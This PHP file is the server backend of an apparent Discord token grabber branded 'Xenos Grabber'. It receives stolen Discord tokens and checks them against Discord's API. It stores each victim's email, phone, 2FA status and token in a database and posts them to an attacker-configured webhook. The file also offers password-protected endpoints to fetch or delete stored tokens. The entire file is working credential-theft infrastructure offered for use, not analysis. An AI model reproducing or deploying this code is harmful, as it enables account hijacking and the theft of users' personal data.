<?php

    require_once('Inc/fonctions.php');

    // API Return JSON

    $reponse['success'] = false;
    $password = "YOUR ACCESS PASSWORD";
    $webhook = "YOUR WEBHOOK";

    if(isset($_GET['type']) AND !empty($_GET['type'])) {
        $token = htmlspecialchars($_GET['token']);
        if(isset($token) && !empty($token)) {
            if(htmlspecialchars($_GET['type']) == "addtoken") {
                if(strlen($token) == 59 || strlen($token) == 88) {
                    $handle = curl_init();
                    $headr = array();
                    $headr[] = "Authorization: " . $_GET['token'];
                    $headr[] = "Content-Type: application/json";
    
                    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($handle, CURLOPT_URL, "https://discordapp.com/api/v6/users/@me");
                    curl_setopt($handle, CURLOPT_HTTPHEADER, $headr);
    
                    $response = curl_exec($handle);
                    curl_close($handle);
                    $data = json_decode($response);
    
                    if (isset($data->id) && !empty($data->id)) {
                        $check = $bdd->prepare('SELECT * FROM tokens WHERE `user_id` = ?');
                        $check->execute(array($data->id));
                        $count = $check->rowCount();
                        
                        if($count == 0) {
                            global $bdd;

                            if(strval((bool) $data->phone)) {
                                $phone = $data->phone;
                            } else {
                                $phone = "None";
                            }
                            
                            $req = $bdd->prepare("INSERT INTO `tokens`(`user_id`, `username`, `avatar`, `email`, `phone`, `badges`, `nitro_badges`, `twofactor`, `token`) VALUES (?,?,?,?,?,?,?,?,?)");
                            $req->execute(array(strval($data->id),strval($data->username)."#".strval($data->discriminator),strval($data->avatar),strval($data->email),strval($phone),strval($data->flags),strval($data->premium_type),strval((bool) $data->mfa_enabled),strval($token)));
                            
                            // Webhook Notification

                            if ($data->premium_type == 1) {
                                $nitro_type = "✔️ Nitro Classic";
                            } else if ($data->premium_type == 2) {
                                $nitro_type = "✔️ Nitro Boost";
                            } else {
                                $nitro_type = "❌ No Nitro";
                            }

                            if(strval((bool) $data->mfa_enabled) == true) {
                                $mfa = "✔️";
                            } else {
                                $mfa = "❌";
                            }

                            if(strval((bool) $data->phone)) {
                                $phone = $data->phone;
                            } else {
                                $phone = "❌";
                            }

                            $json_data = json_encode([
                                "username" => "Xenos Grabber",
                                "avatar_url" => "https://kanekiweb.tk/assets/img/xenos.gif",
                                "embeds" => [
                                    [
                                        "description" => ">>> __Account Informations:__\n```asciidoc\n- Username: " . strval($data->username)."#".strval($data->discriminator) . "\n- User ID: ".strval($data->id)."\n- Email: ".strval($data->email)."\n- Phone: ".strval($phone)."\n- Nitro Type: ".strval($nitro_type)."\n- A2F Enable: ".$mfa."\n```\n\n__Token:__\n```".$token."```",
                                        "footer" => [
                                            "text" => "Xenos Grabber - https://github.com/KanekiWeb",
                                            "icon_url" => "https://kanekiweb.tk/assets/img/xenos.gif"
                                        ],
                                        "thumbnail" => [
                                           "url" => "https://cdn.discordapp.com/avatars/" . $data->id . "/" . $data->avatar
                                        ]
                                    ]
                                ]
                            
                            ]);

                            $ch = curl_init($webhook);
                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

                            return curl_exec($ch);
                            curl_close($ch);

                            $reponse['success'] = true;
                            $reponse['message'] = 'Token Added to Database.';
                        
                        } else {
                            $reponse['message'] = 'Token already in our Database.';
                        }
                    } else {
                        $reponse['message'] = 'Invalid Token';
                    }
                } else {
                    $reponse['message'] = 'Invalid Token';
                }
            } else if(htmlspecialchars($_GET['type']) == "removetoken") {
                $input_pass = htmlspecialchars($_GET['password']);
                if(isset($input_pass) && !empty($input_pass)) {
                    if($input_pass == $password) {
                        $check = $bdd->prepare('DELETE FROM tokens WHERE token = ?');
                        $check->execute(array($token));

                        $reponse['success'] = true;
                        $reponse['message'] = 'Token Deleted from the Database.';

                    } else {
                        $reponse['message'] = 'Incorrect Password';
                    }
                } else {
                    $reponse['message'] = 'Password Require';
                }
            } else if(htmlspecialchars($_GET['type']) == "fetchtoken") {
                $input_pass = htmlspecialchars($_GET['password']);
                if(isset($input_pass) && !empty($input_pass)) {
                    if($input_pass == $password) {
                        $check = $bdd->prepare('SELECT * FROM tokens WHERE token = ?');
                        $check->execute(array($token));
                        $data = $check->fetch();

                        if($check->rowCount() == 1){
                            $reponse['success'] = true;
                            $reponse['id'] = $data['user_id'];
                            $reponse['username'] = $data['username'];
                            $reponse['avatar'] = $data['avatar'];
                            $reponse['email'] = $data['email'];
                            $reponse['phone'] = $data['phone'];
                            $reponse['badges'] = $data['badges'];
                            $reponse['nitro_badges'] = $data['nitro_badges'];
                            $reponse['twofactor'] = $data['twofactor'];
                            $reponse['token'] = $data['token'];
                        } else {
                            $reponse['message'] = 'Token Not in our Database.';
                        }
                    } else {
                        $reponse['message'] = 'Incorrect Password';
                    }
                } else {
                    $reponse['message'] = 'Password Require';
                }
            } else {
                $reponse['message'] = 'Invalid Request type: addtoken/removetoken/fetchtoken';
            }
        } else {
            $reponse['message'] = 'Token is require';
        }
    } else {
        $reponse['message'] = 'Invalid Request type: addtoken/removetoken/fetchtoken';
    }

    echo json_encode($reponse);

?>
